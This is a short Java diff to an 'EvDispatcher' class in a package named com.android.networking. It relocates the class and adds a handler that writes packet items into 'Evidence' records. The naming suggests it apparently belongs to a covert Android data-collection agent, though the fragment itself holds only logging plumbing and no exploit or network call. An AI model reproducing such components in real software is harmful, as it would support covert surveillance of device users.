@@ -7,7 +7,7 @@
  * Author		: zeno
  * *******************************************/
 
-package com.android.networking;
+package com.android.networking.evidence;
 
 import java.io.File;
 import java.util.HashMap;
@@ -17,8 +17,8 @@ import java.util.concurrent.locks.Condition;
 import java.util.concurrent.locks.Lock;
 import java.util.concurrent.locks.ReentrantLock;
 
+import com.android.networking.Packet;
 import com.android.networking.auto.Cfg;
-import com.android.networking.evidence.Evidence;
 import com.android.networking.file.Path;
 import com.android.networking.util.Check;
 
@@ -119,6 +119,10 @@ public class EvDispatcher extends Thread implements Runnable {
 
 		case LogR.LOG_WRITE:
 			writeEv(p);
+			break;
+			
+		case LogR.LOG_ITEMS:
+			itemsEv(p);
 			break;
 
 		case LogR.LOG_CLOSE:
@@ -290,11 +294,26 @@ public class EvDispatcher extends Thread implements Runnable {
 
 		final byte[] additional = p.getAdditional();
 		final byte[] data = p.peek();
+		
 		final Evidence evidence = new Evidence(p.getType());
 
 		evidence.createEvidence(additional);
 		evidence.writeEvidence(data);
 		evidence.close();
+	}
+
+	private void itemsEv(Packet p) {
+		if (Cfg.DEBUG) {
+			Check.ensures(!evidences.containsKey(p.getId()), "evidence already mapped"); //$NON-NLS-1$
+		}
+
+		//final byte[] additional = p.getAdditional();
+		final byte[] data = p.peek();
+		
+		final Evidence evidence = new Evidence(p.getType());
+
+		evidence.atomicWriteOnce(p.getItems());
+
 	}
 
 	/**
